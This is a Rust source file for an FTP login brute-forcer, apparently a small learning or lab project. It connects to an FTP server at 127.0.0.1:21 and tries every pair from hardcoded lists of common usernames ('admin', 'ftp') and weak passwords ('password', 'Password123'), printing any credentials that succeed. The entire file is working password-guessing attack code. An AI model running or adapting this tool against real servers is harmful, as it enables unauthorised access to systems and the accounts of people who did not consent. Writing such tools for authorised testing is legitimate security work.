pub mod data_stream;
pub mod ftp;
pub mod status;
pub mod types;

pub use self::ftp::FtpStream;
pub use self::types::FtpError;

use colored::Colorize;

#[macro_use]
extern crate lazy_static;
extern crate chrono;
extern crate regex;

pub type Result<T> = std::result::Result<T, FtpError>;

fn main() {
    let usernames = vec!["admin", "user", "ftp", "ftpadmin", "ftpuser"];
    let passwords = vec![
        "password",
        "testPassword",
        "Safe123",
        "Password123",
        "ftppass",
        "ftp",
    ];

    let mut ftp_stream =
        FtpStream::connect("127.0.0.1:21").expect("Error connecting to ftp server");

    // let login_attempt = ftp_stream.login("ftp", "pass");
    // match login_attempt {
    //     Ok(_) => {
    //         println!("{} {}", "[+]".green(), "Successful credentials found.");
    //         println!("{} {}:{}", "[+]".green(), "ftp", "pass");
    //         return;
    //     }
    //     Err(_) => {
    //         println!("{} {}:{}", "[-]".yellow(), "ftp", "pass");
    //         false
    //     }
    // };
    // return;

    for username in usernames {
        for password in &passwords {
            println!("{}", password);
            let login_attempt = ftp_stream.login(username, password);

            println!("{:?}", login_attempt);
            match login_attempt {
                Ok(_) => {
                    println!("{} {}", "[+]".green(), "Successful credentials found.");
                    println!("{} {}:{}", "[+]".green(), username, password);
                    return;
                }
                Err(_) => {
                    println!("{} {}:{}", "[-]".yellow(), username, password);
                    false
                }
            };
        }
    }
}
